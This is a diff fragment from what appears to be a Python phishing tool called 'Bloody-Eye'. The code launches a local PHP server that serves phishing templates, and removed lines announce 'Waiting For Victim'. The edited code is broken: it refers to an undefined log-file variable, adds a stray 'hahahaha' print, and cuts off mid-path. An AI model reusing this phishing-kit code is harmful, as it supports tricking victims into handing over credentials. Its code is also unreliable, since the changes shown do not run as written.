@@ -548,18 +548,10 @@ exit();""")
        # - - - - - - - - - - -- - - - - - - - - - - - - - - -
        def deafult_server():
            with open("log","w") as deafult:
-              Popen(('php','-S','localhost:6060','-t','../Bloody-Eye/templates/phishing'),stdout=deafult,stderr=deafult)
-    
+              Popen(('php','-S','localhost:6060','-t','../Bloody-Eye/templates/phishing'),stderr=phplog,stdout=phplog)
+           print("hahahaha")
        deafult_server()
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
-      with open("log","w") as phplog:
-        Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
-      print("")
-      time.sleep(0.07)
-      print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Php Server Has Started on Port 6060")
-      print("")
-      time.sleep(0.07)
-      print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Waiting For Victim ! ! !")
     elif v == "02":
       with open("log","w") as phplog:
          Popen(("php","-S","localhost:6060","-t","../Bloody-Ey$
